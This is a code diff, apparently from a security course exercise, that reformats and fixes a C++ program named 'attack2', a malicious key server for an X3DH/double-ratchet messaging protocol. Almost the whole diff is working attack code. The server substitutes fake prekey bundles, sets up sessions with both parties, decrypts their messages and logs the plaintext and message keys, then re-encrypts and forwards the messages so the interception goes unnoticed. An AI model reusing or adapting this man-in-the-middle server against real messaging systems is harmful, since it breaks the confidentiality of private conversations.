@@ -198,9 +198,7 @@ static string printable(const Bytes &b)
     return s;
 }
 
--- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -
-
-                                                                                                         struct JV
+struct JV
 {
     enum T
     {
@@ -254,7 +252,7 @@ struct JParser
         {
             JV v;
             v.t = JV::STR;
-            v.s = string();
+            v.s = parse_string();
             return v;
         }
         if (c == 't' || c == 'f')
@@ -279,7 +277,7 @@ struct JParser
             ++p;
         return v;
     }
-    string string()
+    std::string parse_string()
     {
         string out;
         ++p;
@@ -322,7 +320,7 @@ struct JParser
         for (;;)
         {
             ws();
-            string k = string();
+            std::string k = parse_string();
             ws();
             if (p < s.size() && s[p] == ':')
                 ++p;
@@ -605,359 +603,360 @@ static string fake_bundle_json(const string &name)
     b += "\"opk_id\":" + to_string(opk_id);
     b += "}";
     return b;
+}
 
-    static void respond_session(const string &from, const string &to,
-                                const JV &init)
+static void respond_session(const string &from, const string &to,
+                            const JV &init)
+{
+    FakeIdentity &f = g_hub.fake_for(to);
+    Key32 ik_dh_init = unb64_32(init.str("ik_dh"));
+    Key32 ek = unb64_32(init.str("ek"));
+    int opk_id = (int)init.num("opk_id");
+
+    Key32 dh1 = x25519(f.spk.priv, ik_dh_init);
+    Key32 dh2 = x25519(f.ik_dh.priv, ek);
+    Key32 dh3 = x25519(f.spk.priv, ek);
+    Bytes ikm(32, 0xFF);
+    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
+    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
+    ikm.insert(ikm.end(), dh3.begin(), dh3.end());
+    if (opk_id != 0 && f.opks.count(opk_id))
     {
-        FakeIdentity &f = g_hub.fake_for(to);
-        Key32 ik_dh_init = unb64_32(init.str("ik_dh"));
-        Key32 ek = unb64_32(init.str("ek"));
-        int opk_id = (int)init.num("opk_id");
-
-        Key32 dh1 = x25519(f.spk.priv, ik_dh_init);
-        Key32 dh2 = x25519(f.ik_dh.priv, ek);
-        Key32 dh3 = x25519(f.spk.priv, ek);
-        Bytes ikm(32, 0xFF);
-        ikm.insert(ikm.end(), dh1.begin(), dh1.end());
-        ikm.insert(ikm.end(), dh2.begin(), dh2.end());
-        ikm.insert(ikm.end(), dh3.begin(), dh3.end());
-        if (opk_id != 0 && f.opks.count(opk_id))
-        {
-            Key32 dh4 = x25519(f.opks[opk_id].priv, ek);
-            ikm.insert(ikm.end(), dh4.begin(), dh4.end());
-        }
-        Key32 salt{};
-        Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
-        Key32 sk{};
-        memcpy(sk.data(), skb.data(), 32);
-
-        Bytes ad(ik_dh_init.begin(), ik_dh_init.end());
-        ad.insert(ad.end(), f.ik_dh.pub.begin(), f.ik_dh.pub.end());
-        g_hub.session[from] = ratchet_init_receiver(sk, f.spk, ad);
-        g_hub.session_ready[from] = true;
-        cerr << "[mitm] responder session established with " << from << "\n";
+        Key32 dh4 = x25519(f.opks[opk_id].priv, ek);
+        ikm.insert(ikm.end(), dh4.begin(), dh4.end());
     }
+    Key32 salt{};
+    Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
+    Key32 sk{};
+    memcpy(sk.data(), skb.data(), 32);
 
-    static bool initiate_session(const string &to, const FakeIdentity &as_me)
-    {
-        if (g_hub.session_ready[to])
-            return true;
-        auto it = g_hub.real.find(to);
-        if (it == g_hub.real.end() || !it->second.present)
-        {
-            cerr << "[mitm] no real bundle for " << to << " yet\n";
-            return false;
-        }
-        RealBundle &rb = it->second;
-        Key32 spk = unb64_32(rb.spk);
-        Key32 ik_dh = unb64_32(rb.ik_dh);
-        Key32 opk{};
-        bool have_opk = !rb.opk.empty();
-        if (have_opk)
-            opk = unb64_32(rb.opk);
+    Bytes ad(ik_dh_init.begin(), ik_dh_init.end());
+    ad.insert(ad.end(), f.ik_dh.pub.begin(), f.ik_dh.pub.end());
+    g_hub.session[from] = ratchet_init_receiver(sk, f.spk, ad);
+    g_hub.session_ready[from] = true;
+    cerr << "[mitm] responder session established with " << from << "\n";
+}
 
-        DH ek = x25519_generate();
-        Key32 dh1 = x25519(as_me.ik_dh.priv, spk);
-        Key32 dh2 = x25519(ek.priv, ik_dh);
-        Key32 dh3 = x25519(ek.priv, spk);
-        Bytes ikm(32, 0xFF);
-        ikm.insert(ikm.end(), dh1.begin(), dh1.end());
-        ikm.insert(ikm.end(), dh2.begin(), dh2.end());
-        ikm.insert(ikm.end(), dh3.begin(), dh3.end());
-        if (have_opk)
-        {
-            Key32 dh4 = x25519(ek.priv, opk);
-            ikm.insert(ikm.end(), dh4.begin(), dh4.end());
-        }
-        Key32 salt{};
-        Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
-        Key32 sk{};
-        memcpy(sk.data(), skb.data(), 32);
-
-        Bytes ad(as_me.ik_dh.pub.begin(), as_me.ik_dh.pub.end());
-        ad.insert(ad.end(), ik_dh.begin(), ik_dh.end());
-        g_hub.session[to] = ratchet_init_sender(sk, spk, ad);
-        g_hub.session_ready[to] = true;
-        g_hub.to_peer_first[to] = true;
-
-        string init = "{";
-        init += "\"ik_sig\":" + jstr(b64(as_me.ik_sig_pub.data(), 32)) + ",";
-        init += "\"ik_dh\":" + jstr(b64(as_me.ik_dh.pub)) + ",";
-        init += "\"ek\":" + jstr(b64(ek.pub)) + ",";
-        init += "\"opk_id\":" + to_string(rb.opk_id);
-        init += "}";
-        g_hub.init_for[to] = init;
-        cerr << "[mitm] initiator session established toward " << to << "\n";
+static bool initiate_session(const string &to, const FakeIdentity &as_me)
+{
+    if (g_hub.session_ready[to])
         return true;
+    auto it = g_hub.real.find(to);
+    if (it == g_hub.real.end() || !it->second.present)
+    {
+        cerr << "[mitm] no real bundle for " << to << " yet\n";
+        return false;
+    }
+    RealBundle &rb = it->second;
+    Key32 spk = unb64_32(rb.spk);
+    Key32 ik_dh = unb64_32(rb.ik_dh);
+    Key32 opk{};
+    bool have_opk = !rb.opk.empty();
+    if (have_opk)
+        opk = unb64_32(rb.opk);
+
+    DH ek = x25519_generate();
+    Key32 dh1 = x25519(as_me.ik_dh.priv, spk);
+    Key32 dh2 = x25519(ek.priv, ik_dh);
+    Key32 dh3 = x25519(ek.priv, spk);
+    Bytes ikm(32, 0xFF);
+    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
+    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
+    ikm.insert(ikm.end(), dh3.begin(), dh3.end());
+    if (have_opk)
+    {
+        Key32 dh4 = x25519(ek.priv, opk);
+        ikm.insert(ikm.end(), dh4.begin(), dh4.end());
+    }
+    Key32 salt{};
+    Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
+    Key32 sk{};
+    memcpy(sk.data(), skb.data(), 32);
+
+    Bytes ad(as_me.ik_dh.pub.begin(), as_me.ik_dh.pub.end());
+    ad.insert(ad.end(), ik_dh.begin(), ik_dh.end());
+    g_hub.session[to] = ratchet_init_sender(sk, spk, ad);
+    g_hub.session_ready[to] = true;
+    g_hub.to_peer_first[to] = true;
+
+    string init = "{";
+    init += "\"ik_sig\":" + jstr(b64(as_me.ik_sig_pub.data(), 32)) + ",";
+    init += "\"ik_dh\":" + jstr(b64(as_me.ik_dh.pub)) + ",";
+    init += "\"ek\":" + jstr(b64(ek.pub)) + ",";
+    init += "\"opk_id\":" + to_string(rb.opk_id);
+    init += "}";
+    g_hub.init_for[to] = init;
+    cerr << "[mitm] initiator session established toward " << to << "\n";
+    return true;
+}
+
+static string build_frame(const string &from, const string &to,
+                          const Enc &e, const string &init_json)
+{
+    string h = "{\"dh\":" + jstr(e.dh) + ",\"pn\":" +
+               to_string(e.pn) + ",\"n\":" + to_string(e.n);
+    if (!init_json.empty())
+        h += ",\"init\":" + init_json;
+    h += "}";
+    string f = "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
+               ",\"header\":" + h + ",\"ct\":" + jstr(b64(e.ct)) + "}";
+    return f;
+}
+
+static void intercept(const string &from, const string &to,
+                      const JV &frame)
+{
+    const JV &hdr = frame.at("header");
+    string dh = hdr.str("dh");
+    long pn = hdr.num("pn");
+    long n = hdr.num("n");
+    Bytes ct = unb64(frame.str("ct"));
+
+    if (hdr.has("init") && !g_hub.session_ready[from])
+        respond_session(from, to, hdr.at("init"));
+
+    string alt_hdr;
+    const string *alt_hdr_p = nullptr;
+    if (hdr.has("init"))
+    {
+        const JV &in = hdr.at("init");
+        alt_hdr = "{\"dh\":" + jstr(dh) + ",\"pn\":" + to_string(pn) +
+                  ",\"n\":" + to_string(n) + ",\"init\":{\"ik_sig\":" +
+                  jstr(in.str("ik_sig")) + ",\"ik_dh\":" + jstr(in.str("ik_dh")) +
+                  ",\"ek\":" + jstr(in.str("ek")) + ",\"opk_id\":" +
+                  to_string(in.num("opk_id")) + "}}";
+        alt_hdr_p = &alt_hdr;
     }
 
-    static string build_frame(const string &from, const string &to,
-                              const Enc &e, const string &init_json)
+    if (!g_hub.session_ready[from])
     {
-        string h = "{\"dh\":" + jstr(e.dh) + ",\"pn\":" +
-                   to_string(e.pn) + ",\"n\":" + to_string(e.n);
-        if (!init_json.empty())
-            h += ",\"init\":" + init_json;
-        h += "}";
-        string f = "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
-                   ",\"header\":" + h + ",\"ct\":" + jstr(b64(e.ct)) + "}";
-        return f;
+        cerr << "[mitm] FORWARD-ONLY " << from << "->" << to
+             << " (no session, opaque relay)\n";
+        g_hub.mailbox[to].frames.push_back(
+            "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
+            ",\"header\":" + "{\"dh\":" + jstr(dh) + ",\"pn\":" +
+            to_string(pn) + ",\"n\":" + to_string(n) + "}" +
+            ",\"ct\":" + jstr(frame.str("ct")) + "}");
+        return;
     }
 
-    static void intercept(const string &from, const string &to,
-                          const JV &frame)
+    optional<Bytes> pt;
+    DecryptProbe probe;
+    try
     {
-        const JV &hdr = frame.at("header");
-        string dh = hdr.str("dh");
-        long pn = hdr.num("pn");
-        long n = hdr.num("n");
-        Bytes ct = unb64(frame.str("ct"));
+        pt = ratchet_decrypt(g_hub.session[from], dh, pn, n, ct, alt_hdr_p,
+                             &probe);
+    }
+    catch (const exception &ex)
+    {
+        cerr << "[mitm] decrypt error " << from << ": " << ex.what()
+             << "\n";
+        pt = nullopt;
+    }
+    if (!pt)
+    {
+        cerr << "[mitm] AUTH-FAIL " << from << "->" << to
+             << " (cannot recover, relaying opaque)\n";
 
-        if (hdr.has("init") && !g_hub.session_ready[from])
-            respond_session(from, to, hdr.at("init"));
-
-        string alt_hdr;
-        const string *alt_hdr_p = nullptr;
-        if (hdr.has("init"))
+        if (probe.have_mk)
         {
-            const JV &in = hdr.at("init");
-            alt_hdr = "{\"dh\":" + jstr(dh) + ",\"pn\":" + to_string(pn) +
-                      ",\"n\":" + to_string(n) + ",\"init\":{\"ik_sig\":" +
-                      jstr(in.str("ik_sig")) + ",\"ik_dh\":" + jstr(in.str("ik_dh")) +
-                      ",\"ek\":" + jstr(in.str("ek")) + ",\"opk_id\":" +
-                      to_string(in.num("opk_id")) + "}}";
-            alt_hdr_p = &alt_hdr;
-        }
-
-        if (!g_hub.session_ready[from])
-        {
-            cerr << "[mitm] FORWARD-ONLY " << from << "->" << to
-                 << " (no session, opaque relay)\n";
-            g_hub.mailbox[to].frames.push_back(
-                "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
-                ",\"header\":" + "{\"dh\":" + jstr(dh) + ",\"pn\":" +
-                to_string(pn) + ",\"n\":" + to_string(n) + "}" +
-                ",\"ct\":" + jstr(frame.str("ct")) + "}");
-            return;
-        }
-
-        optional<Bytes> pt;
-        DecryptProbe probe;
-        try
-        {
-            pt = ratchet_decrypt(g_hub.session[from], dh, pn, n, ct, alt_hdr_p,
-                                 &probe);
-        }
-        catch (const exception &ex)
-        {
-            cerr << "[mitm] decrypt error " << from << ": " << ex.what()
+            Bytes cand = chacha20_unauth_decrypt(probe.mk, ct);
+            cerr << "[diag] message_key   = " << to_hex(probe.mk) << "\n";
+            cerr << "[diag] nonce         = " << to_hex(ZERO_NONCE, 12)
                  << "\n";
-            pt = nullopt;
-        }
-        if (!pt)
-        {
-            cerr << "[mitm] AUTH-FAIL " << from << "->" << to
-                 << " (cannot recover, relaying opaque)\n";
-
-            if (probe.have_mk)
+            cerr << "[diag] ciphertext    = " << to_hex(ct) << "\n";
+            cerr << "[diag] primary_AD    = " << to_hex(probe.ad) << "\n";
+            cerr << "[diag]   as_text      \"" << printable(probe.ad)
+                 << "\"\n";
+            if (!probe.alt_ad.empty())
             {
-                Bytes cand = chacha20_unauth_decrypt(probe.mk, ct);
-                cerr << "[diag] message_key   = " << to_hex(probe.mk) << "\n";
-                cerr << "[diag] nonce         = " << to_hex(ZERO_NONCE, 12)
+                cerr << "[diag] alt_AD(init)  = " << to_hex(probe.alt_ad)
                      << "\n";
-                cerr << "[diag] ciphertext    = " << to_hex(ct) << "\n";
-                cerr << "[diag] primary_AD    = " << to_hex(probe.ad) << "\n";
-                cerr << "[diag]   as_text      \"" << printable(probe.ad)
-                     << "\"\n";
-                if (!probe.alt_ad.empty())
-                {
-                    cerr << "[diag] alt_AD(init)  = " << to_hex(probe.alt_ad)
-                         << "\n";
-                    cerr << "[diag]   as_text      \""
-                         << printable(probe.alt_ad) << "\"\n";
-                }
-                cerr << "[diag] UNAUTH_PLAINTEXT = \"" << printable(cand)
-                     << "\"\n";
-                cerr << "[diag]   (readable above => key OK, AD mismatch only; "
-                        "garbage => key/nonce wrong)\n";
+                cerr << "[diag]   as_text      \""
+                     << printable(probe.alt_ad) << "\"\n";
             }
-            else
-            {
-                cerr << "[diag] no message key was derived (session/ratchet "
-                        "path not reached)\n";
-            }
-            g_hub.mailbox[to].frames.push_back(
-                "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
-                ",\"header\":{\"dh\":" + jstr(dh) + ",\"pn\":" +
-                to_string(pn) + ",\"n\":" + to_string(n) +
-                "},\"ct\":" + jstr(frame.str("ct")) + "}");
-            return;
-        }
-
-        string plaintext((char *)pt->data(), pt->size());
-        cerr << "[mitm] RECOVERED " << from << "->" << to << ": \""
-             << plaintext << "\"\n";
-
-        FakeIdentity &as_sender = g_hub.fake_for(from);
-        if (!initiate_session(to, as_sender))
-        {
-            cerr << "[mitm] cannot forward to " << to
-                 << " (no session yet), dropping\n";
-            return;
-        }
-
-        Enc e = ratchet_encrypt(g_hub.session[to], *pt);
-        string init_json;
-        if (g_hub.to_peer_first[to])
-        {
-            init_json = g_hub.init_for[to];
-            g_hub.to_peer_first[to] = false;
-        }
-        g_hub.mailbox[to].frames.push_back(build_frame(from, to, e, init_json));
-        cerr << "[mitm] RE-ENCRYPTED " << from << "->" << to
-             << " and queued for delivery\n";
-    }
-
-    static bool send_line(int fd, const string &s)
-    {
-        string o = s + "\n";
-        return send(fd, o.data(), o.size(), 0) == (ssize_t)o.size();
-    }
-
-    static void handle_request(int fd, const string &line)
-    {
-        JV req = jparse(line);
-        string type = req.str("type");
-        lock_guard<mutex> lk(g_hub.mu);
-
-        if (type == "register")
-        {
-            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
-        }
-        else if (type == "publish")
-        {
-            string user = req.str("user");
-            const JV &bundle = req.at("bundle");
-            RealBundle rb;
-            rb.present = true;
-            rb.ik_sig = bundle.str("ik_sig");
-            rb.ik_dh = bundle.str("ik_dh");
-            rb.spk = bundle.str("spk");
-            rb.spk_sig = bundle.str("spk_sig");
-            if (req.has("opks") && req.at("opks").t == JV::ARR &&
-                !req.at("opks").arr.empty())
-            {
-                const JV &first = req.at("opks").arr.front();
-                rb.opk = first.str("pub");
-                rb.opk_id = (int)first.num("id");
-                rb.count = (int)req.at("opks").arr.size();
-            }
-            g_hub.real[user] = rb;
-            cerr << "[srv] stored real bundle for " << user << " (count="
-                 << rb.count << ")\n";
-            send_line(fd, "{\"type\":\"ok\",\"ok\":true,\"count\":" + to_string(rb.count) +
-                              "}");
-        }
-        else if (type == "fetch_bundle")
-        {
-            string user = req.str("user");
-            string bundle = fake_bundle_json(user);
-            cerr << "[mitm] handing SUBSTITUTED bundle for " << user
-                 << " to a fetcher\n";
-            send_line(fd, "{\"type\":\"bundle\",\"bundle\":" + bundle +
-                              ",\"count\":99}");
-        }
-        else if (type == "send")
-        {
-            const JV &frame = req.at("frame");
-            string from = frame.str("from");
-            string to = frame.str("to");
-            intercept(from, to, frame);
-            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
-        }
-        else if (type == "poll")
-        {
-            string user = req.str("user");
-            string out = "{\"type\":\"frames\",\"frames\":[";
-            auto &mb = g_hub.mailbox[user];
-            for (size_t i = 0; i < mb.frames.size(); ++i)
-            {
-                if (i)
-                    out += ",";
-                out += mb.frames[i];
-            }
-            out += "]}";
-            mb.frames.clear();
-            send_line(fd, out);
+            cerr << "[diag] UNAUTH_PLAINTEXT = \"" << printable(cand)
+                 << "\"\n";
+            cerr << "[diag]   (readable above => key OK, AD mismatch only; "
+                    "garbage => key/nonce wrong)\n";
         }
         else
         {
-            send_line(fd, "{\"type\":\"err\",\"err\":\"unknown\"}");
+            cerr << "[diag] no message key was derived (session/ratchet "
+                    "path not reached)\n";
         }
+        g_hub.mailbox[to].frames.push_back(
+            "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
+            ",\"header\":{\"dh\":" + jstr(dh) + ",\"pn\":" +
+            to_string(pn) + ",\"n\":" + to_string(n) +
+            "},\"ct\":" + jstr(frame.str("ct")) + "}");
+        return;
     }
 
-    static void serve_client(int fd)
+    string plaintext((char *)pt->data(), pt->size());
+    cerr << "[mitm] RECOVERED " << from << "->" << to << ": \""
+         << plaintext << "\"\n";
+
+    FakeIdentity &as_sender = g_hub.fake_for(from);
+    if (!initiate_session(to, as_sender))
     {
-        string buf;
-        char chunk[8192];
-        for (;;)
-        {
-            ssize_t r = recv(fd, chunk, sizeof(chunk), 0);
-            if (r <= 0)
-                break;
-            buf.append(chunk, r);
-            size_t nl;
-            while ((nl = buf.find('\n')) != string::npos)
-            {
-                string line = buf.substr(0, nl);
-                buf.erase(0, nl + 1);
-                if (!line.empty())
-                    handle_request(fd, line);
-            }
-        }
-        close(fd);
+        cerr << "[mitm] cannot forward to " << to
+             << " (no session yet), dropping\n";
+        return;
     }
 
-    int main(int argc, char **argv)
+    Enc e = ratchet_encrypt(g_hub.session[to], *pt);
+    string init_json;
+    if (g_hub.to_peer_first[to])
     {
-        if (sodium_init() < 0)
-        {
-            cerr << "libsodium init failed\n";
-            return 1;
-        }
-        int port = 9000;
-        for (int i = 1; i < argc; ++i)
-        {
-            string a = argv[i];
-            if (a == "--port" && i + 1 < argc)
-                port = atoi(argv[++i]);
-            else if (a == "--help")
-            {
-                cout << "usage: attack2 [--port 9000]\n";
-                return 0;
-            }
-        }
-
-        int srv = socket(AF_INET, SOCK_STREAM, 0);
-        int opt = 1;
-        setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-        sockaddr_in addr{};
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = INADDR_ANY;
-        addr.sin_port = htons(port);
-        if (bind(srv, (sockaddr *)&addr, sizeof(addr)) < 0)
-        {
-            perror("bind");
-            return 1;
-        }
-        listen(srv, 32);
-        cerr << "[mitm] malicious server listening on :" << port << "\n";
-        for (;;)
-        {
-            int fd = accept(srv, nullptr, nullptr);
-            if (fd < 0)
-                continue;
-            thread(serve_client, fd).detach();
-        }
-        return 0;
+        init_json = g_hub.init_for[to];
+        g_hub.to_peer_first[to] = false;
     }
+    g_hub.mailbox[to].frames.push_back(build_frame(from, to, e, init_json));
+    cerr << "[mitm] RE-ENCRYPTED " << from << "->" << to
+         << " and queued for delivery\n";
+}
+
+static bool send_line(int fd, const string &s)
+{
+    string o = s + "\n";
+    return send(fd, o.data(), o.size(), 0) == (ssize_t)o.size();
+}
+
+static void handle_request(int fd, const string &line)
+{
+    JV req = jparse(line);
+    string type = req.str("type");
+    lock_guard<mutex> lk(g_hub.mu);
+
+    if (type == "register")
+    {
+        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
+    }
+    else if (type == "publish")
+    {
+        string user = req.str("user");
+        const JV &bundle = req.at("bundle");
+        RealBundle rb;
+        rb.present = true;
+        rb.ik_sig = bundle.str("ik_sig");
+        rb.ik_dh = bundle.str("ik_dh");
+        rb.spk = bundle.str("spk");
+        rb.spk_sig = bundle.str("spk_sig");
+        if (req.has("opks") && req.at("opks").t == JV::ARR &&
+            !req.at("opks").arr.empty())
+        {
+            const JV &first = req.at("opks").arr.front();
+            rb.opk = first.str("pub");
+            rb.opk_id = (int)first.num("id");
+            rb.count = (int)req.at("opks").arr.size();
+        }
+        g_hub.real[user] = rb;
+        cerr << "[srv] stored real bundle for " << user << " (count="
+             << rb.count << ")\n";
+        send_line(fd, "{\"type\":\"ok\",\"ok\":true,\"count\":" + to_string(rb.count) +
+                          "}");
+    }
+    else if (type == "fetch_bundle")
+    {
+        string user = req.str("user");
+        string bundle = fake_bundle_json(user);
+        cerr << "[mitm] handing SUBSTITUTED bundle for " << user
+             << " to a fetcher\n";
+        send_line(fd, "{\"type\":\"bundle\",\"bundle\":" + bundle +
+                          ",\"count\":99}");
+    }
+    else if (type == "send")
+    {
+        const JV &frame = req.at("frame");
+        string from = frame.str("from");
+        string to = frame.str("to");
+        intercept(from, to, frame);
+        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
+    }
+    else if (type == "poll")
+    {
+        string user = req.str("user");
+        string out = "{\"type\":\"frames\",\"frames\":[";
+        auto &mb = g_hub.mailbox[user];
+        for (size_t i = 0; i < mb.frames.size(); ++i)
+        {
+            if (i)
+                out += ",";
+            out += mb.frames[i];
+        }
+        out += "]}";
+        mb.frames.clear();
+        send_line(fd, out);
+    }
+    else
+    {
+        send_line(fd, "{\"type\":\"err\",\"err\":\"unknown\"}");
+    }
+}
+
+static void serve_client(int fd)
+{
+    string buf;
+    char chunk[8192];
+    for (;;)
+    {
+        ssize_t r = recv(fd, chunk, sizeof(chunk), 0);
+        if (r <= 0)
+            break;
+        buf.append(chunk, r);
+        size_t nl;
+        while ((nl = buf.find('\n')) != string::npos)
+        {
+            string line = buf.substr(0, nl);
+            buf.erase(0, nl + 1);
+            if (!line.empty())
+                handle_request(fd, line);
+        }
+    }
+    close(fd);
+}
+
+int main(int argc, char **argv)
+{
+    if (sodium_init() < 0)
+    {
+        cerr << "libsodium init failed\n";
+        return 1;
+    }
+    int port = 9000;
+    for (int i = 1; i < argc; ++i)
+    {
+        string a = argv[i];
+        if (a == "--port" && i + 1 < argc)
+            port = atoi(argv[++i]);
+        else if (a == "--help")
+        {
+            cout << "usage: attack2 [--port 9000]\n";
+            return 0;
+        }
+    }
+
+    int srv = socket(AF_INET, SOCK_STREAM, 0);
+    int opt = 1;
+    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    sockaddr_in addr{};
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(port);
+    if (bind(srv, (sockaddr *)&addr, sizeof(addr)) < 0)
+    {
+        perror("bind");
+        return 1;
+    }
+    listen(srv, 32);
+    cerr << "[mitm] malicious server listening on :" << port << "\n";
+    for (;;)
+    {
+        int fd = accept(srv, nullptr, nullptr);
+        if (fd < 0)
+            continue;
+        thread(serve_client, fd).detach();
+    }
+    return 0;
+}
